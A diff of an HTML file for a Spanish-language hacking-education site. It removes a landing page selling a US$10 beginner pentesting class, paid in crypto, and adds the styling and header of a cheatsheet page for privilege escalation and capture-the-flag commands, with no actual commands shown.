@@ -1,628 +1,463 @@
 <!DOCTYPE html>
-<html class="dark" lang="es">
+<html lang="es">
 <head>
-<meta charset="utf-8"/>
-<meta content="width=device-width, initial-scale=1.0, viewport-fit=cover" name="viewport"/>
-<title>Clase de Pentesting desde cero · US$10 | juanicerouno</title>
-<meta name="description" content="Clase en Discord para empezar en Hacking Ético con una ruta clara de 6 pasos. US$10, pago único: envías por BEP20, mandas el comprobante por WhatsApp y agendas tu clase con Juan."/>
-<meta name="theme-color" content="#0d0e13"/>
-<meta property="og:type" content="website"/>
-<meta property="og:title" content="Clase de Pentesting desde cero · US$10"/>
-<meta property="og:description" content="Una ruta clara en 6 pasos para empezar en Hacking Ético. Acceso en 3 pasos."/>
-<meta property="og:locale" content="es_ES"/>
-<link rel="icon" type="image/webp" href="assets/logo-juan.webp"/>
-<link rel="apple-touch-icon" href="assets/logo-juan.webp"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/>
-<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;family=JetBrains+Mono:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0..1,0&amp;display=swap" rel="stylesheet"/>
-<script src="https://cdn.tailwindcss.com"></script>
-<script id="tailwind-config">
-tailwind.config={darkMode:"class",theme:{extend:{
-  colors:{
-    "surface":"#121318","surface-bright":"#38393f",
-    "surface-container-lowest":"#0d0e13","surface-container-low":"#1a1b21","surface-container":"#1e1f25",
-    "surface-container-high":"#292a2f","surface-container-highest":"#34343a",
-    "on-surface":"#ece8f4","on-surface-variant":"#c4b8d6","outline-variant":"#4c3e58",
-    "primary":"#d066f6","primary-container":"#b000f0","primary-fixed-dim":"#9a12d6","on-primary-fixed":"#ffffff",
-    "secondary":"#f2c14e","secondary-fixed":"#e7c4ff","error":"#ffb4ab"
-  },
-  borderRadius:{"DEFAULT":"0.125rem","lg":"0.25rem","xl":"0.5rem","full":"9999px"},
-  spacing:{"space-xs":"0.25rem","space-sm":"0.5rem","space-md":"1rem","space-lg":"1.5rem","space-xl":"2.5rem","margin":"2rem","margin-mobile":"1rem"},
-  fontFamily:{"label-sm":["JetBrains Mono"],"label-md":["JetBrains Mono"],"label-lg":["JetBrains Mono"],"headline-xl":["Inter"],"headline-lg":["Inter"],"headline-md":["Inter"],"headline-sm":["Inter"],"body-lg":["Inter"],"body-md":["Inter"],"body-sm":["Inter"]},
-  fontSize:{
-    "label-sm":["11px",{"lineHeight":"14px","letterSpacing":"0.06em","fontWeight":"500"}],
-    "label-md":["12px",{"lineHeight":"16px","letterSpacing":"0.04em","fontWeight":"500"}],
-    "label-lg":["14px",{"lineHeight":"20px","letterSpacing":"0.05em","fontWeight":"600"}],
-    "headline-xl":["56px",{"lineHeight":"64px","letterSpacing":"-0.03em","fontWeight":"800"}],
-    "headline-xl-mobile":["34px",{"lineHeight":"42px","letterSpacing":"-0.02em","fontWeight":"800"}],
-    "headline-lg":["40px",{"lineHeight":"48px","letterSpacing":"-0.025em","fontWeight":"700"}],
-    "headline-lg-mobile":["28px",{"lineHeight":"36px","letterSpacing":"-0.02em","fontWeight":"700"}],
-    "headline-md":["28px",{"lineHeight":"36px","letterSpacing":"-0.015em","fontWeight":"600"}],
-    "headline-sm":["20px",{"lineHeight":"28px","letterSpacing":"-0.01em","fontWeight":"600"}],
-    "body-lg":["18px",{"lineHeight":"28px","letterSpacing":"-0.005em","fontWeight":"400"}],
-    "body-md":["15px",{"lineHeight":"24px","letterSpacing":"0em","fontWeight":"400"}],
-    "body-sm":["13px",{"lineHeight":"20px","letterSpacing":"0.01em","fontWeight":"400"}]
-  }
-}}};
-</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>juanicerouno // cheatsheets</title>
 <style>
-  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
-  body{margin:0;overscroll-behavior-y:none}
-  [id]{scroll-margin-top:5rem}
-  .material-symbols-outlined{font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 24;line-height:1}
-  .icon-fill{font-variation-settings:'FILL' 1,'wght' 400,'GRAD' 0,'opsz' 24}
-  details>summary{list-style:none;cursor:pointer}
-  details>summary::-webkit-details-marker{display:none}
-  details[open] .chevron{transform:rotate(180deg)}
-  .cta-glow{animation:glow 2.4s ease-out infinite}
-  @keyframes glow{0%{box-shadow:0 0 0 0 rgba(176,0,240,.45)}70%{box-shadow:0 0 0 14px rgba(176,0,240,0)}100%{box-shadow:0 0 0 0 rgba(176,0,240,0)}}
-  #sticky-cta{transform:translateY(110%);transition:transform .3s ease}
-  .term-pending [data-term-row]{display:none}
-  .term-caret::after{content:"";display:inline-block;width:.45rem;height:.85em;margin-left:.15rem;background:#b000f0;vertical-align:-.12em}
-  #sticky-cta.is-visible{transform:translateY(0)}
-  .cupo-mark{height:.55rem;border-radius:9999px;background:#4c3e58;transform-origin:left center}
-  .cupo-mark.is-on{background:#b000f0;animation:cupo-in .4s ease both}
-  .is-hidden{display:none!important}
-  @keyframes cupo-in{from{transform:scaleX(.15);opacity:.35}to{transform:scaleX(1);opacity:1}}
-  a:focus-visible,button:focus-visible,summary:focus-visible{outline:2px solid #d066f6;outline-offset:3px}
-  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation:none!important;transition:none!important}}
+  :root{
+    --bg:#060a0f; --panel:#0b131b; --border:#16222c;
+    --fg:#cdeaf0; --dim:#5f7e87; --cyan:#4df3ff; --magenta:#ff4dd8;
+    --mono:'JetBrains Mono','Courier New',monospace;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:var(--mono); line-height:1.5;
+    background-image:
+      linear-gradient(rgba(77,243,255,.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(77,243,255,.025) 1px, transparent 1px);
+    background-size: 32px 32px;
+  }
+  header{
+    padding:28px 20px 18px; text-align:center;
+    border-bottom:1px solid var(--border);
+  }
+  header h1{
+    margin:0; font-size:1.4rem; letter-spacing:.04em;
+    color:var(--cyan); text-shadow:0 0 14px rgba(77,243,255,.35);
+  }
+  header h1 span{color:var(--magenta); text-shadow:0 0 14px rgba(255,77,216,.35);}
+  header p{margin:6px 0 0; color:var(--dim); font-size:.85rem;}
+
+  .search-wrap{max-width:720px; margin:22px auto 0; padding:0 20px;}
+  #q{
+    width:100%; padding:12px 14px; background:var(--panel);
+    border:1px solid var(--border); color:var(--fg); font-family:var(--mono);
+    font-size:.95rem; border-radius:4px; outline:none;
+  }
+  #q:focus{border-color:var(--cyan); box-shadow:0 0 0 1px var(--cyan);}
+  #q::placeholder{color:var(--dim);}
+
+  nav{
+    max-width:900px; margin:16px auto 0; padding:0 20px;
+    display:flex; gap:10px; flex-wrap:wrap; justify-content:center;
+  }
+  nav button{
+    background:none; border:1px solid var(--border); color:var(--dim);
+    font-family:var(--mono); font-size:.78rem; padding:6px 12px;
+    border-radius:3px; cursor:pointer; letter-spacing:.03em;
+  }
+  nav button.active{color:var(--bg); background:var(--cyan); border-color:var(--cyan);}
+
+  main{max-width:900px; margin:24px auto 60px; padding:0 20px;}
+
+  .sheet{margin-bottom:10px;}
+  .sheet-title{
+    font-size:1.05rem; color:var(--magenta); margin:34px 0 4px;
+    border-bottom:1px solid var(--border); padding-bottom:6px;
+  }
+  .sect{
+    border:1px solid var(--border); border-radius:5px; margin:10px 0;
+    background:var(--panel); overflow:hidden;
+  }
+  .sect-head{
+    padding:10px 14px; cursor:pointer; display:flex;
+    justify-content:space-between; align-items:center; gap:10px;
+    user-select:none;
+  }
+  .sect-head h3{margin:0; font-size:.92rem; color:var(--cyan); font-weight:600;}
+  .sect-head .car{color:var(--dim); font-size:.8rem; transition:transform .15s;}
+  .sect.open .car{transform:rotate(90deg);}
+  .sect-body{display:none; padding:0 14px 14px;}
+  .sect.open .sect-body{display:block;}
+
+  .block{margin:12px 0;}
+  .block p{margin:0 0 6px; color:var(--dim); font-size:.82rem;}
+  pre{
+    margin:0; background:#020507; border:1px solid var(--border);
+    border-radius:4px; padding:10px 12px; overflow-x:auto;
+    font-size:.82rem; position:relative;
+  }
+  pre code{color:var(--fg); white-space:pre;}
+  .copy-btn{
+    position:absolute; top:6px; right:6px; background:var(--border);
+    color:var(--dim); border:none; font-family:var(--mono); font-size:.68rem;
+    padding:3px 7px; border-radius:3px; cursor:pointer;
+  }
+  .copy-btn:hover{color:var(--cyan);}
+  .copy-btn.done{color:var(--cyan); border:1px solid var(--cyan);}
+
+  mark{background:rgba(255,77,216,.3); color:#fff; border-radius:2px;}
+  .empty{text-align:center; color:var(--dim); margin-top:60px; font-size:.9rem;}
+  footer{text-align:center; color:var(--dim); font-size:.72rem; padding:20px; border-top:1px solid var(--border);}
+  footer a{color:var(--cyan); text-decoration:none;}
 </style>
 </head>
-<body class="bg-surface font-body-md text-body-md text-on-surface antialiased selection:bg-primary-container selection:text-on-primary-fixed">
+<body>
 
-<svg aria-hidden="true" class="hidden" xmlns="http://www.w3.org/2000/svg">
-  <symbol id="i-wa" viewBox="0 0 24 24"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></symbol>
-</svg>
-
-<!-- HEADER -->
-<header class="fixed inset-x-0 top-0 z-50 bg-surface-container-lowest/90 backdrop-blur-md shadow-[0_1px_12px_rgba(0,0,0,0.5)]">
-  <div class="h-16 max-w-[1200px] mx-auto px-margin-mobile md:px-margin flex items-center justify-between gap-space-md">
-    <a class="flex items-center gap-space-sm min-w-0" href="#inicio" aria-label="Ir al inicio">
-      <img alt="" class="w-9 h-9 rounded-full object-cover shrink-0 ring-1 ring-primary-container/40" height="36" width="36" src="assets/logo-juan.webp"/>
-      <span class="flex flex-col min-w-0">
-        <span class="font-label-md text-label-md text-primary tracking-wider uppercase truncate">juanicerouno</span>
-        <span class="font-label-sm text-label-sm text-on-surface-variant truncate">CLASE PENTESTING · US$10</span>
-      </span>
-    </a>
-    <nav aria-label="Secciones" class="hidden md:flex items-center gap-space-lg">
-      <a class="font-label-md text-label-md uppercase tracking-wider text-on-surface-variant hover:text-primary transition-colors" href="#ruta">Ruta</a>
-      <a class="font-label-md text-label-md uppercase tracking-wider text-on-surface-variant hover:text-primary transition-colors" href="#pago">Cómo acceder</a>
-      <a class="font-label-md text-label-md uppercase tracking-wider text-on-surface-variant hover:text-primary transition-colors" href="#faq">FAQ</a>
-    </nav>
-    <a class="inline-flex items-center justify-center gap-space-xs h-10 px-space-md shrink-0 bg-primary-container text-on-primary-fixed font-label-md text-label-md uppercase tracking-wider rounded-lg transition-colors hover:bg-primary-fixed-dim" href="#pago">
-      <span class="material-symbols-outlined text-[18px]">account_balance_wallet</span>Acceder
-    </a>
-  </div>
+<header>
+  <h1>juani<span>@</span>cheatsheets</h1>
+  <p>comandos de referencia — escalado de privilegios &amp; captura de flags</p>
 </header>
 
-<main class="pt-16">
-
-  <!-- 1. HERO -->
-  <section id="inicio" class="relative overflow-hidden bg-surface-container-lowest">
-    <img alt="" aria-hidden="true" class="pointer-events-none absolute inset-0 h-full w-full object-cover object-[center_right] opacity-50" src="assets/Fondo_hero_main.webp"/>
-    <div aria-hidden="true" class="pointer-events-none absolute inset-0 bg-gradient-to-r from-surface-container-lowest/92 via-surface-container-lowest/75 to-surface-container-lowest/40"></div>
-    <div aria-hidden="true" class="pointer-events-none absolute inset-0 bg-gradient-to-b from-surface-container-lowest/35 via-transparent to-surface-container-lowest"></div>
-    <div aria-hidden="true" class="pointer-events-none absolute -top-32 -right-32 w-[480px] h-[480px] rounded-full bg-primary-container/20 blur-3xl"></div>
-    <div class="relative z-10 max-w-[1200px] mx-auto px-margin-mobile md:px-margin py-space-xl md:py-20 grid grid-cols-1 lg:grid-cols-12 gap-space-xl items-center">
-
-      <div class="lg:col-span-7 flex flex-col gap-space-md">
-        <span class="inline-flex items-center self-start gap-space-xs px-space-sm py-1 rounded-lg bg-surface-container-high font-label-sm text-label-sm text-primary uppercase tracking-wider">
-          <span class="relative flex w-2 h-2"><span class="absolute inline-flex h-full w-full rounded-full bg-primary-container opacity-75 animate-ping"></span><span class="relative inline-flex w-2 h-2 rounded-full bg-primary-container"></span></span>
-          Para principiantes · Clase en Discord
-        </span>
-        <h1 class="font-headline-xl text-headline-xl-mobile md:text-headline-xl text-on-surface tracking-tight">
-          ¿Quieres empezar en Pentesting pero <span class="text-primary">no sabes por dónde?</span>
-        </h1>
-        <p class="font-body-lg text-body-md md:text-body-lg text-on-surface-variant max-w-[580px]">
-          Te doy una <strong class="text-on-surface font-semibold">ruta clara en 6 pasos</strong> para empezar en Hacking Ético sin perder meses saltando entre tutoriales.
-        </p>
-        <div class="pt-space-sm flex flex-col sm:flex-row gap-space-sm">
-          <a class="cta-glow inline-flex items-center justify-center gap-space-sm h-14 px-space-xl rounded-xl bg-primary-container text-on-primary-fixed font-label-lg text-label-lg uppercase tracking-wider transition-transform hover:-translate-y-0.5" href="#pago">
-            <span class="material-symbols-outlined text-[22px]">bolt</span>Acceder por US$10
-          </a>
-          <a class="inline-flex items-center justify-center gap-space-sm h-14 px-space-lg rounded-xl bg-surface-container-high text-on-surface font-label-md text-label-md uppercase tracking-wider hover:text-primary transition-colors" data-wa="hero-duda" data-wa-msg="Hola Team 01, tengo una duda sobre la clase de Pentesting de US$10: " href="#faq">
-            <svg aria-hidden="true" class="w-5 h-5"><use href="#i-wa"/></svg>Tengo una duda
-          </a>
-        </div>
-        <div class="flex items-center gap-space-sm pt-space-xs">
-          <img alt="Logo de juanicerouno" class="w-10 h-10 rounded-full object-cover shrink-0 ring-2 ring-primary-container/40" height="40" width="40" src="assets/logo-juan.webp"/>
-          <p class="font-body-sm text-body-sm text-on-surface-variant">
-            Por <strong class="text-on-surface font-semibold">juanicerouno</strong> · contenido de hacking en
-            <a class="underline underline-offset-2 hover:text-primary" href="https://www.youtube.com/@Juanicerouno?sub_confirmation=1" rel="noopener noreferrer" target="_blank">YouTube</a>,
-            <a class="underline underline-offset-2 hover:text-primary" href="https://www.instagram.com/juanicerouno/reels/" rel="noopener noreferrer" target="_blank">Instagram</a> y
-            <a class="underline underline-offset-2 hover:text-primary" href="https://www.tiktok.com/@juani_silveira" rel="noopener noreferrer" target="_blank">TikTok</a>.
-          </p>
-        </div>
-      </div>
-
-      <div class="lg:col-span-5 w-full">
-        <div class="rounded-xl bg-surface-container-low shadow-2xl overflow-hidden ring-1 ring-outline-variant/40">
-          <div class="h-10 px-space-md bg-surface-container-high flex items-center justify-between">
-            <span class="flex items-center gap-1.5" aria-hidden="true">
-              <span class="w-2.5 h-2.5 rounded-full bg-error"></span><span class="w-2.5 h-2.5 rounded-full bg-surface-bright"></span><span class="w-2.5 h-2.5 rounded-full bg-primary-fixed-dim"></span>
-            </span>
-            <span class="font-label-sm text-label-sm text-on-surface-variant truncate px-space-sm">juan@pentest-box:~/clase</span>
-            <span class="font-label-sm text-label-sm text-primary">bash</span>
-          </div>
-          <div id="terminal-log" class="p-space-md md:p-space-lg flex flex-col gap-space-sm font-label-sm text-label-sm" aria-label="Clase desde cero, en Discord. El horario se acuerda con Juan. US$10, pago único, USDT o BTC por la red BEP20.">
-            <p class="text-on-surface-variant"><span class="text-primary">root@juan01:~#</span> <span data-term-cmd>cat clase.txt</span></p>
-            <dl class="flex flex-col gap-y-space-sm p-space-md rounded-lg bg-surface-container-lowest">
-              <div data-term-row class="grid grid-cols-[80px_1fr] gap-x-space-md"><dt class="text-primary">NIVEL</dt><dd class="text-on-surface">Desde cero</dd></div>
-              <div data-term-row class="grid grid-cols-[80px_1fr] gap-x-space-md"><dt class="text-primary">DÓNDE</dt><dd class="text-on-surface">Discord</dd></div>
-              <div data-term-row class="grid grid-cols-[80px_1fr] gap-x-space-md"><dt class="text-primary">HORARIO</dt><dd class="text-on-surface">Lo acuerdas con Juan</dd></div>
-              <div data-term-row class="grid grid-cols-[80px_1fr] gap-x-space-md"><dt class="text-primary">PRECIO</dt><dd class="text-primary font-semibold">US$10 · pago único</dd></div>
-              <div data-term-row class="grid grid-cols-[80px_1fr] gap-x-space-md"><dt class="text-primary">PAGO</dt><dd class="text-on-surface">USDT / BTC · red BEP20</dd></div>
-            </dl>
-            <p class="text-on-surface-variant pt-space-xs"><span class="text-secondary-fixed">juan@box:~$</span> <span data-term-final>./acceder --pasos=3</span></p>
-          </div>
-          <script>
-            if (!window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
-              document.getElementById("terminal-log").classList.add("term-pending");
-            }
-          </script>
-        </div>
-      </div>
-
-    </div>
-  </section>
-
-  <!-- 2. PROBLEMA + RUTA -->
-  <section id="ruta" class="bg-surface py-space-xl md:py-16">
-    <div class="max-w-[1200px] mx-auto px-margin-mobile md:px-margin">
-      <div class="max-w-[720px] mb-space-lg">
-        <h2 class="font-headline-lg text-headline-lg-mobile md:text-headline-lg text-on-surface tracking-tight">
-          No te falta información. <span class="text-primary">Te falta orden.</span>
-        </h2>
-        <p class="text-on-surface-variant mt-space-sm">Videos sin orden, cientos de herramientas y metodologías que no encajan. Esta es la secuencia que sigo yo, del día cero en adelante:</p>
-      </div>
-
-      <ol class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-space-sm md:gap-space-md">
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">01</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">Fundamentos</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Redes (TCP/IP, puertos, DNS) y terminal Linux.</p></div>
-        </li>
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">02</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">El entorno</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Cómo funcionan objetivos, servicios y protocolos.</p></div>
-        </li>
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">03</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">Herramientas</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Nmap, fuzzing y proxies: cuándo usar cada una.</p></div>
-        </li>
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">04</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">Metodología</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Reconocimiento, detección, análisis y documentación.</p></div>
-        </li>
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">05</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">Práctica legal</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">TryHackMe, Hack The Box y VMs propias.</p></div>
-        </li>
-        <li class="flex gap-space-md p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <span class="font-label-lg text-label-lg text-primary shrink-0">06</span>
-          <div><h3 class="font-headline-sm text-headline-sm text-on-surface">Siguiente nivel</h3><p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Web, Red Team, Active Directory y certificaciones.</p></div>
-        </li>
-      </ol>
-
-      <div class="mt-space-lg grid grid-cols-1 md:grid-cols-2 gap-space-sm md:gap-space-md">
-        <div class="p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <p class="flex items-center gap-space-xs font-label-md text-label-md text-primary uppercase"><span class="material-symbols-outlined text-[18px]">check_circle</span>Es para ti si</p>
-          <p class="mt-space-xs text-on-surface-variant">Empiezas desde cero, viste muchos tutoriales y sigues sin saber qué estudiar primero.</p>
-        </div>
-        <div class="p-space-md md:p-space-lg rounded-xl bg-surface-container-low">
-          <p class="flex items-center gap-space-xs font-label-md text-label-md text-error uppercase"><span class="material-symbols-outlined text-[18px]">block</span>No es para ti si</p>
-          <p class="mt-space-xs text-on-surface-variant">Quieres entrar a cuentas o redes ajenas, o esperas ser profesional en una sola clase.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-  
-<!-- TESTIMONIOS -->
-<section id="testimonios" class="bg-surface-container-low py-space-xl md:py-16">
-  <div class="max-w-[1200px] mx-auto px-margin-mobile md:px-margin">
-    <div class="max-w-[720px] mb-space-lg">
-      <span class="font-label-sm text-label-sm text-primary uppercase tracking-widest">[ Alumnos ]</span>
-      <h2 class="font-headline-lg text-headline-lg-mobile md:text-headline-lg text-on-surface tracking-tight mt-space-xs">
-        Lo que dicen <span class="text-primary">quienes ya hicieron la clase</span>
-      </h2>
-    </div>
-
-    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-space-sm md:gap-space-md">
-      <figure class="rounded-xl bg-surface-container overflow-hidden ring-1 ring-outline-variant/40">
-        <img src="assets/testimonio-1.webp" alt="Mensaje de un alumno sobre la clase" loading="lazy" width="600" height="800" class="w-full h-auto"/>
-      </figure>
-      <figure class="rounded-xl bg-surface-container overflow-hidden ring-1 ring-outline-variant/40">
-        <img src="assets/testimonio-2.webp" alt="Mensaje de un alumno sobre la clase" loading="lazy" width="600" height="800" class="w-full h-auto"/>
-      </figure>
-      <figure class="rounded-xl bg-surface-container overflow-hidden ring-1 ring-outline-variant/40">
-        <img src="assets/testimonio-3.webp" alt="Mensaje de un alumno sobre la clase" loading="lazy" width="600" height="800" class="w-full h-auto"/>
-      </figure>
-    </div>
-
-    <div class="mt-space-lg flex justify-center">
-      <a class="inline-flex items-center justify-center gap-space-sm h-14 px-space-xl rounded-xl bg-primary-container text-on-primary-fixed font-label-lg text-label-lg uppercase tracking-wider transition-transform hover:-translate-y-0.5" href="#pago">
-        <span class="material-symbols-outlined text-[22px]">bolt</span>Acceder por US$10
-      </a>
-    </div>
-  </div>
-</section>
-  
-  <!-- 3. ACCESO EN 3 PASOS -->
-  <section id="pago" class="bg-surface-container-lowest py-space-xl md:py-16">
-    <div class="max-w-[880px] mx-auto px-margin-mobile md:px-margin">
-      <div class="text-center mb-space-lg md:mb-space-xl">
-        <span class="font-label-sm text-label-sm text-primary uppercase tracking-widest">[ Acceso · pago único ]</span>
-        <h2 class="font-headline-lg text-headline-lg-mobile md:text-headline-lg text-on-surface tracking-tight mt-space-xs">Accede en 3 pasos por <span class="text-primary">US$10</span></h2>
-        <p class="text-on-surface-variant mt-space-xs">Sin registros ni pasarelas. Pagas, me escribes y agendamos tu clase.</p>
-      </div>
-
-      <div id="cupos-panel" class="mb-space-lg rounded-xl bg-surface-container p-space-md md:p-space-lg flex flex-col gap-space-md">
-        <div class="flex flex-col sm:flex-row sm:items-end sm:justify-between gap-space-md">
-          <p class="font-label-lg text-label-lg uppercase tracking-wider text-on-surface">Quedan <span id="cupos-left" class="text-primary">10</span> de 10</p>
-          <p id="cupos-countdown-wrap" class="flex flex-col sm:items-end">
-            <span class="font-label-sm text-label-sm text-on-surface-variant uppercase">Para entrar a esta clase</span>
-            <span id="cupos-countdown" class="font-label-lg text-[22px] leading-none text-primary tracking-wider">07:00:00</span>
-          </p>
-        </div>
-        <div id="cupos-marks" class="grid grid-cols-10 gap-1" role="img" aria-label="Cupos de la clase"></div>
-      </div>
-
-      <div id="clase-llena" class="is-hidden rounded-xl bg-surface-container p-space-lg md:p-space-xl text-center flex flex-col items-center gap-space-md">
-        <span class="material-symbols-outlined text-primary text-[32px]">campaign</span>
-        <h3 class="font-headline-sm text-headline-sm text-on-surface">Espera la próxima clase en los estados</h3>
-        <p class="text-on-surface-variant max-w-[460px]">Los 10 cupos de esta clase ya están tomados. Ahí avisamos cuando abra la siguiente.</p>
-        <div class="w-full flex flex-col sm:flex-row gap-space-sm sm:justify-center">
-          <a class="inline-flex items-center justify-center gap-space-xs h-12 px-space-md rounded-xl bg-surface-container-high text-on-surface hover:text-primary font-label-md text-label-md uppercase" href="https://www.youtube.com/@Juanicerouno?sub_confirmation=1" rel="noopener noreferrer" target="_blank"><span class="material-symbols-outlined text-[18px]">play_circle</span>YouTube</a>
-          <a class="inline-flex items-center justify-center gap-space-xs h-12 px-space-md rounded-xl bg-surface-container-high text-on-surface hover:text-primary font-label-md text-label-md uppercase" href="https://www.instagram.com/juanicerouno/reels/" rel="noopener noreferrer" target="_blank"><span class="material-symbols-outlined text-[18px]">photo_camera</span>Instagram</a>
-          <a class="inline-flex items-center justify-center gap-space-xs h-12 px-space-md rounded-xl bg-surface-container-high text-on-surface hover:text-primary font-label-md text-label-md uppercase" href="https://www.tiktok.com/@juani_silveira" rel="noopener noreferrer" target="_blank"><span class="material-symbols-outlined text-[18px]">smart_display</span>TikTok</a>
-        </div>
-      </div>
-
-      <ol id="pasos-pago" class="relative flex flex-col gap-space-md">
-        <span aria-hidden="true" class="absolute left-[27px] md:left-[35px] top-10 bottom-10 w-px bg-outline-variant"></span>
-
-        <!-- Paso 1: wallet -->
-        <li class="relative rounded-xl bg-surface-container p-space-md md:p-space-lg ring-1 ring-primary-container/40 shadow-2xl">
-          <div class="flex items-start gap-space-md">
-            <span class="relative z-10 w-10 h-10 md:w-12 md:h-12 rounded-full bg-primary-container text-on-primary-fixed flex items-center justify-center font-label-lg text-label-lg shrink-0">1</span>
-            <div class="min-w-0 flex-1">
-              <h3 class="font-headline-sm text-headline-sm text-on-surface">Envía los US$10 a esta wallet</h3>
-              <p id="wallet-amount" class="font-body-sm text-body-sm text-on-surface-variant mt-1">Envía 10 USDT.</p>
-            </div>
-          </div>
-
-          <div class="mt-space-md flex gap-space-xs" role="tablist" aria-label="Elige la moneda">
-            <button class="flex-1 h-11 rounded-lg bg-primary-container text-on-primary-fixed font-label-md text-label-md uppercase tracking-wider" type="button" role="tab" id="tab-usdt" aria-selected="true" aria-controls="wallet-panel" data-wallet="usdt">USDT</button>
-            <button class="flex-1 h-11 rounded-lg bg-surface-container-high text-on-surface-variant font-label-md text-label-md uppercase tracking-wider hover:text-on-surface" type="button" role="tab" id="tab-btc" aria-selected="false" aria-controls="wallet-panel" data-wallet="btc">BTC</button>
-          </div>
-
-          <div id="wallet-panel" class="mt-space-md grid grid-cols-1 sm:grid-cols-[1fr_auto] gap-space-md items-center" role="tabpanel" aria-labelledby="tab-usdt">
-            <div class="flex flex-col gap-space-sm min-w-0">
-              <div class="p-space-md rounded-lg bg-surface-container-lowest ring-1 ring-outline-variant/60">
-                <div class="flex flex-wrap items-center justify-between gap-space-xs">
-                  <span id="wallet-token" class="font-label-sm text-label-sm text-on-surface uppercase">Tether (USDT)</span>
-                  <span id="wallet-network" class="px-space-sm py-0.5 rounded-lg bg-primary-container/15 font-label-sm text-label-sm text-primary">BEP20 · BNB Smart Chain</span>
-                </div>
-                <p id="wallet" class="font-label-lg text-[13px] md:text-label-lg text-on-surface break-all mt-space-sm select-all">0x70B330d176d40BA85dF884B48553601fCcFAbD16</p>
-              </div>
-              <button class="inline-flex items-center justify-center gap-space-sm h-12 rounded-xl bg-primary-container text-on-primary-fixed font-label-lg text-label-lg uppercase tracking-wider transition-colors hover:bg-primary-fixed-dim" data-copy="#wallet" type="button">
-                <span class="material-symbols-outlined text-[20px]" data-copy-icon>content_copy</span><span data-copy-label>Copiar dirección</span>
-              </button>
-              <p class="flex items-start gap-space-xs font-body-sm text-body-sm text-on-surface-variant">
-                <span class="material-symbols-outlined text-secondary text-[18px] shrink-0">warning</span>
-                <span id="wallet-note">Usa <strong class="text-on-surface">solo la red BEP20</strong>. Si envías USDT por otra red, los fondos se pierden.</span>
-              </p>
-            </div>
-            <figure class="hidden sm:flex flex-col items-center gap-space-xs">
-              <img id="wallet-qr" alt="Código QR para enviar 10 USDT por BEP20" class="w-36 h-36 rounded-lg object-cover" height="144" width="144" src="assets/QR_USDT.jpeg"/>
-              <figcaption id="wallet-qr-caption" class="font-label-sm text-label-sm text-on-surface-variant">QR de USDT</figcaption>
-            </figure>
-          </div>
-        </li>
-
-        <!-- Paso 2: comprobante -->
-        <li class="relative rounded-xl bg-surface-container-low p-space-md md:p-space-lg">
